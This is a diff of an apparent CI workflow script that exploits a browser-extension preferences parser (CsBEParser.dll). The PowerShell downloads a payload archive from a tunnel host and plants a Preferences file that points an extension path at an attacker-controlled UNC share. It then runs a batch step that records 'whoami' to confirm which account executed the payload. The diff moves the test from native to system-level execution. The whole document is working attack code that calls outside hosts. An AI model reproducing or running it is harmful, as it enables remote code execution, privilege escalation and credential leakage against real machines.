@@ -13,13 +13,11 @@ jobs:
           New-Item -ItemType Directory -Force C:/beparser/profile | Out-Null
           Invoke-WebRequest -Headers @{"X-Pinggy-No-Screen"="true"} -Uri "https://gmdxb-2600-1f18-68f7-2200-aca3-a18d-1711-1005.run.pinggy-free.link/payload.zip" -OutFile C:/beparser/payload.zip
           Expand-Archive -Path C:/beparser/payload.zip -DestinationPath C:/beparser -Force
-          $unc = "\\j9adzdnyijwvlprf--benative1787400904.oob.blackmail.zip\owned"
+          $unc = "\\j9adzdnyijwvlprf--besystem1787400987.oob.blackmail.zip\owned"
           $obj = @{extensions=@{settings=@{bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb=@{path=$unc;state=1}}}}
           $json = $obj | ConvertTo-Json -Depth 8 -Compress
           [System.IO.File]::WriteAllText("C:/beparser/profile/Preferences", $json, (New-Object System.Text.UTF8Encoding($false)))
           Write-Output "PREFERENCES=$json"
-          & C:/beparser/profile_harness_native.exe C:/beparser/CsBEParser.dll C:/beparser/profile
-          Write-Output "DIRECT_EXIT=$LASTEXITCODE"
           @'
           @echo off
           whoami > C:\beparser\identity.txt
@@ -32,7 +30,7 @@ jobs:
             if (Test-Path C:/beparser/system.code) { break }
             Start-Sleep -Seconds 2
           }
-          Write-Output "MARKER=benative1787400904"
+          Write-Output "MARKER=besystem1787400987"
           Write-Output "UNC=$unc"
           Write-Output "--- identity ---"
           if (Test-Path C:/beparser/identity.txt) { Get-Content C:/beparser/identity.txt }
